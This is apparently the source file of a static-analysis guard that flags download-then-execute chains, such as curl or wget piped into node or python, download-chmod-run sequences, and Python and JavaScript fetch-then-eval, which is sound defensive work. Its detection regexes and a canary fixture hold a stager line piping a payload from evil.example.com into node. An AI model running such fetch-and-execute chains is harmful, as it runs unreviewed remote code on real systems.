"""Guard: no download-then-execute chain (checklist §8, new item).

Fetching a remote payload and immediately handing it to an execution sink, never
reviewing it, never pinning its contents, is the classic dropper/stager shape: a
malicious dependency, compromised CI script, or backdoored installer fetches its real
payload at run time so static analysis of the shipped source never sees it. Adapted
from Datadog GuardDog's `threat-process-download-exec` source-code rule (GuardDog
screens third-party packages; this guard applies the same signatures to the target
app's own source). Kept deliberately to the highest-confidence shapes: this is the
noisiest of the GuardDog rules ported this research cycle, so the Windows/PowerShell,
bare-pip-install, and single-signal sub-patterns from the source rule are dropped:

  **shell pipe-to-interpreter (HIGH):** `curl ... | node|ksh|python2|...` or
  `wget -O- ... | ...` with `curl`/`wget` in command position: fetch and immediately
  execute, no intermediate file, no review step. Only the shapes `curl-pipe-to-shell` does
  not already report: that guard owns `curl|wget ... | bash|sh|zsh|dash|python3|perl|ruby`
  in `.sh`/`.bash` files, so a line it matches is left to it (a second HIGH under this id
  would ignore an owner's reviewed exception and `# security: allow-curl-pipe-shell`
  pragma, PR #1048 review). What remains is the interpreters it does not list (`node`,
  `ksh`, `python2`) and `.zsh` scripts, which it does not scan.

  **download-chmod-execute (HIGH):** `curl -o FILE ...` (or `wget -O FILE ...`)
  followed by a `chmod +x FILE` and/or direct execution of that same file on a
  later/same line.

  **Python download-plus-exec, same file, within a short window (HIGH):** a
  `requests.get`/`urllib.urlopen`/`urllib.urlretrieve` call with a bare `exec`/`eval`
  call (not a method call) within a few lines, or `urlretrieve` paired with a
  `subprocess.run/call/Popen` call shortly after (download a binary, then run it).

  **JS fetch-then-eval (HIGH):** `fetch(...)` chained with `.then(...eval...)`. A file
  that merely contains both a `fetch(` and an unrelated `eval(`/`new Function(` is not
  reported: that co-occurrence is every swagger-ui/webpack bundle and template engine
  (PR #1048 review, measured on litellm's vendored bundles).

Fires on Python/JS/shell source when `python`/`javascript`/`typescript` is detected.
Suppress an audited case (a legitimate, reviewed installer script) with a whole-file
pragma comment anywhere in the file:

    # security: allow-download-execute-chain
"""
from __future__ import annotations

import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files,
    pragma_present,
    read,
    rel,
    strip_hash_comments,
    strip_js_comments,
    strip_python_strings,
)
from .curl_pipe_to_shell import _CURL_PIPE_SHELL

_SHELL_SUFFIXES = (".sh", ".bash", ".zsh")
_JS_SUFFIXES = (".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs")
_PY_SUFFIXES = (".py", ".pyi")

# `curl`/`wget` in COMMAND position (start of line or after a shell separator, the same anchor
# curl-pipe-to-shell uses), so `grep curl notes | sh` and a `die "... curl ... | sh"` message
# string are not read as a download being executed.
_SHELL_PIPE_EXEC = re.compile(
    r"(?:^|[|&;(])\s*(?:sudo\s+)?(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?"
    r"(?:(?:ba|z|k)?sh|python[23]?|node|perl)\b",
    re.IGNORECASE,
)
# The files curl-pipe-to-shell scans (its `run()`): a line its pattern matches there is its finding.
_CURL_PIPE_TO_SHELL_SUFFIXES = (".sh", ".bash")
# Where a download lands, read from the line's TOKENS rather than by one regex: `curl ... -o FILE` as
# a single pattern backtracks across the line from every `curl` (quadratic), and the remote-name
# form with two lazy gaps (`curl ... -O ... https://`) was cubic on a line of repeated `curl -O `
# with no URL (PR #1048 re-review H2). Flags are case-SENSITIVE (fullmatch, no IGNORECASE): curl's
# output file is `-o FILE`, `-O` saves to the URL's basename, and wget's is `-O FILE` (its
# lowercase `-o FILE` is the LOG file).
# A token that IS the curl/wget command word, so a URL or path that merely contains the word does
# not start a new command: optionally after an assignment (`r=$(curl`, `x=\`curl`,
# `alias dl='curl`), behind `!`, `$(`, `(`, a backtick or a quote, and with a path (`/usr/bin/curl`).
# One shell command: a run of quoted strings, escaped characters, and anything that is not an
# unquoted `;`, `&` or `|`. A curl/wget's flags end at the next such separator, so
# `| tar -xzO file` or `&& unzip -qo x.zip` is never read as the download's output flag, while a
# separator inside quotes or escaped (`"https://h/p?a=1&b=2"`, `-H 'X: a|b'`, `\&`) is not a
# boundary. Every alternative consumes at least one character and the quoted ones cannot overlap
# the others, so `findall` is linear even on unclosed quotes (an unmatched quote is skipped).
_CMD_CHUNK = re.compile(r"""(?:'[^']*'|"(?:\\.|[^"\\])*"|\\.|[^;&|'"\\])+""")
_TOOL_TOKEN = re.compile(r"(?:\w+=)?[!$(`'\"]*(?:[\w.-]*/)*(curl|wget)")
# The output flag may end a combined short-flag cluster (`-fsSLo FILE`, `-qO FILE`).
_CURL_OUTPUT_FLAG = re.compile(r"-[A-Za-z]*o")
_WGET_OUTPUT_FLAG = re.compile(r"-[A-Za-z]*O")
_REMOTE_NAME_FLAG = re.compile(r"-[A-Za-z]*O|--remote-name")
# Output "files" that put nothing on disk: `-o -`/`-O -` is stdout, and the device sinks.
_NOT_A_FILE = frozenset({"-", "/dev/null", "/dev/stdout", "/dev/stderr"})
# What ends a path on a shell line: whitespace, separators, redirects. Parens and backticks are NOT
# a break (they are stripped at the ends in `_path_key` instead): splitting `"$(mktemp)"` at `(`
# left the key `$`, which matched any other `"$(...)"` (PR #1048 final review).
_PATH_BREAK = re.compile(r"[\s;&|<>]+")
# Making a file executable or running it. The bare `sh FILE.sh` form must be in COMMAND position
# (line start or after a separator): unanchored, it matched the tail of a download-only line,
# `curl -o /tmp/get.sh https://host/get.sh`, and reported nothing-executed as executed.
_CHMOD_OR_RUN = re.compile(
    r"\bchmod\s+\+?x\b|&&\s*\./|(?:^|[;&|])\s*(?:sudo\s+)?(?:ba|z|k)?sh\s+\S+\.sh\b",
    re.IGNORECASE,
)

_PY_DOWNLOAD = re.compile(
    r"\brequests\.get\s*\(|\burllib\.\w+\.urlopen\s*\(|\burllib\.\w+\.urlretrieve\s*\(",
    re.IGNORECASE,
)
_PY_URLRETRIEVE = re.compile(r"\burllib\.\w+\.urlretrieve\s*\(", re.IGNORECASE)
_PY_EXEC_EVAL = re.compile(r"(?<!\.)\b(?:exec|eval)\s*\(")
_PY_SUBPROCESS_RUN = re.compile(r"\bsubprocess\.(?:run|call|Popen)\s*\(")

_JS_FETCH_THEN_EVAL = re.compile(r"\bfetch\s*\([^)]*\)[\s\S]{0,120}?\.then\s*\([^)]*\beval\b", re.IGNORECASE)

_WINDOW = 15
_PRAGMA = re.compile(r"security:\s*allow-download-execute-chain")
_STANDARDS = ["OWASP:A08", "CWE-494"]


def _download_targets(line: str) -> list[str]:
    """EVERY file a curl/wget on this line downloads to: each `-o FILE` (curl) / `-O FILE` (wget)
    value, and for curl each remote-name flag paired, in order, with the next URL after it (its
    basename). Each shell command on the line (split at unquoted `;`, `&`, `|`) is read on its
    own and only a curl/wget command's flags count, so `curl -o a U; curl -o b U` and
    `curl -o a U -o b U` both yield `a` and `b` (taking only the first value was a regression
    against the greedy regex this replaced), while `wget -O- U | tar -xzO file` yields nothing
    (PR #1048 re-review). Linear: one split into commands, one pass over each command's tokens."""
    targets: list[str] = []
    for command in _CMD_CHUNK.findall(line):
        targets.extend(_command_targets(command.split()))
    return targets


def _command_targets(tokens: list[str]) -> list[str]:
    """The download targets of ONE shell command's tokens (see `_download_targets`)."""
    targets: list[str] = []
    tool: str | None = None
    pending_remote = 0
    k = 0
    while k < len(tokens):
        tok = tokens[k]
        m = _TOOL_TOKEN.fullmatch(tok)
        if m is not None:
            tool, pending_remote = m.group(1), 0
        elif tool is not None:
            output_flag = _CURL_OUTPUT_FLAG if tool == "curl" else _WGET_OUTPUT_FLAG
            if output_flag.fullmatch(tok) and k + 1 < len(tokens):
                targets.append(tokens[k + 1])
                k += 2
                continue
            if tool == "curl" and _REMOTE_NAME_FLAG.fullmatch(tok):
                pending_remote += 1
            elif pending_remote:
                base = _url_basename(tok)
                if base is not None:
                    targets.append(base)
                    pending_remote -= 1
        k += 1
    return targets


def _path_key(token: str) -> str:
    """The comparable form of a path as written on a shell line: the first piece before any
    separator or redirect, without surrounding parens, backticks, quotes or a leading `./`. So
    `./out`, `"out"`, `out;` and `(out)` all read as `out`, while `./layout.sh` stays
    `layout.sh` and `./tmp/x` stays `tmp/x` (a different file from `/tmp/x`)."""
    piece = next((s for s in _PATH_BREAK.split(token) if s), "").strip("()`'\"")
    return piece[2:] if piece.startswith("./") else piece


def _url_basename(tok: str) -> str | None:
    """The basename `curl -O` saves an `http(s)://` token to, or None when it is not a URL."""
    url = tok.strip("'\"")
    if not url.startswith(("http://", "https://")):
        return None
    path = re.split(r"[?#]", url, maxsplit=1)[0].split("://", 1)[1].rstrip("/")
    return path.rsplit("/", 1)[-1] or None


class DownloadExecuteChainGuard(Guard):
    id = "download-execute-chain"
    title = "No download-then-execute chain (fetch a remote payload, run it unreviewed)"
    area = "Code safety"

    # stager.sh: curl https://evil.example.com/payload.js | node -> fires
    # download-execute-chain/shell-pipe-exec (HIGH). `node`, not `bash`, so the plant does not
    # also fire curl-pipe-to-shell, which owns the `| bash` form.
    canary_plant = CanaryPlant(
        files={"stager.sh": "#!/bin/sh\ncurl -fsSL https://evil.example.com/payload.js | node\n"},
        expects=frozenset({"download-execute-chain/shell-pipe-exec"}),
    )

    def applies(self, profile: StackProfile) -> bool:
        return bool({"python", "javascript", "typescript"} & profile.features)

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        seen: set[Path] = set()
        for f in iter_files(root, _PY_SUFFIXES + _JS_SUFFIXES + _SHELL_SUFFIXES):
            if f in seen:
                continue
            seen.add(f)
            if is_nonproduct_path(rel(root, f), profile.archive_segments):
                continue
            out.extend(self._scan(root, f))
        return out

    def _scan(self, root: Path, f: Path) -> list[Finding]:
        suffix = f.suffix.lower()
        text = read(f)
        if pragma_present(_PRAGMA, text, dialect=comment_dialect_for(f)):
            return []

        if suffix in _SHELL_SUFFIXES:
            code = strip_hash_comments(text)
            return self._scan_shell(root, f, code, pipe_owned=suffix in _CURL_PIPE_TO_SHELL_SUFFIXES)
        if suffix in _PY_SUFFIXES:
            code = strip_python_strings(text, filename=f)
            code = "\n".join(
                ln if not ln.lstrip().startswith("#") else "" for ln in code.splitlines()
            )
            return self._scan_python(root, f, code)
        code = strip_js_comments(text, strip_strings=False)
        return self._scan_js(root, f, code)

    def _scan_shell(self, root: Path, f: Path, code: str, *, pipe_owned: bool) -> list[Finding]:
        out: list[Finding] = []
        downloaded: set[str] = set()
        # Downloads saved under a bare name (no `/`), i.e. into whatever directory the script was in.
        # Without tracking `cd`, such a file may be run by a directory-qualified path
        # (`cd /opt/app/bin && curl ... -o tool`, then `chmod +x /opt/app/bin/tool`), so a path's
        # basename is matched against these. Accepted FP class (PR #1048, as at 49f3b373): a bare
        # `-o x` also matches an unrelated `bin/x`.
        downloaded_bare: set[str] = set()
        # One pass, at most one download-chmod-execute finding per line: a line is reported when
        # it makes executable or runs a file downloaded on that line or an earlier one.
        for i, line in enumerate(code.splitlines(), start=1):
            if _SHELL_PIPE_EXEC.search(line) and not (pipe_owned and _CURL_PIPE_SHELL.search(line)):
                out.append(self._finding(root, f, i, "shell-pipe-exec", "`curl`/`wget` is piped directly into a shell/python/node/perl interpreter: fetch and execute with no review step."))
            for target in _download_targets(line):
                key = _path_key(target)
                if key and key not in _NOT_A_FILE:
                    downloaded.add(key)
                    if "/" not in key:
                        downloaded_bare.add(key)
            if downloaded and _CHMOD_OR_RUN.search(line):
                # Looked up by THIS line's own path tokens, so the cost is the line's length, with
                # no cap on how many downloads are remembered (a cap was an evasion: payload, then
                # decoys, then the chmod). A whole path, never a substring of another name:
                # `-o out` matches `./out` but not `./layout.sh` or `./out.sh`.
                hit = next(
                    (
                        k for k in map(_path_key, _PATH_BREAK.split(line))
                        # (a bare `k` is its own basename, so this also covers bare downloads)
                        if k in downloaded or k.rsplit("/", 1)[-1] in downloaded_bare
                    ),
                    None,
                )
                if hit is not None:
                    out.append(self._finding(root, f, i, "download-chmod-execute", f"`{hit}` is downloaded and then made executable and/or run."))
        return out

    def _scan_python(self, root: Path, f: Path, code: str) -> list[Finding]:
        lines = code.splitlines()
        out: list[Finding] = []
        for i, line in enumerate(lines):
            if not _PY_EXEC_EVAL.search(line):
                continue
            window = lines[max(0, i - _WINDOW):i]
            if any(_PY_DOWNLOAD.search(w) for w in window):
                out.append(self._finding(root, f, i + 1, "python-download-exec", "A remote-download call (`requests.get`/`urllib.urlopen`/`urlretrieve`) appears a few lines before a bare `exec`/`eval` call: fetch-then-execute with no review step."))
        for i, line in enumerate(lines):
            if not _PY_SUBPROCESS_RUN.search(line):
                continue
            window = lines[max(0, i - _WINDOW):i]
            if any(_PY_URLRETRIEVE.search(w) for w in window):
                out.append(self._finding(root, f, i + 1, "python-download-run", "`urllib.urlretrieve` downloads a file a few lines before a `subprocess` call runs it: download-a-binary-then-execute-it."))
        return out

    def _scan_js(self, root: Path, f: Path, code: str) -> list[Finding]:
        m = _JS_FETCH_THEN_EVAL.search(code)
        if m is None:
            return []
        line = code.count("\n", 0, m.start()) + 1
        return [self._finding(root, f, line, "js-fetch-then-eval", "A `fetch(...)` response is chained directly into `eval` via `.then(...)`.")]

    def _finding(self, root: Path, f: Path, line: int, rule_suffix: str, message: str) -> Finding:
        return Finding(
            check_id=self.id,
            severity="high",
            title=self.title,
            location=f"{rel(root, f)}:{line}",
            message=message,
            remediation=(
                "Never execute a remotely-fetched payload without a pinned checksum and a "
                "review step. If this is a genuinely reviewed installer script, mark it with "
                "the inline suppress pragma."
            ),
            rule=f"download-execute-chain/{rule_suffix}",
            standards=list(_STANDARDS),
        )
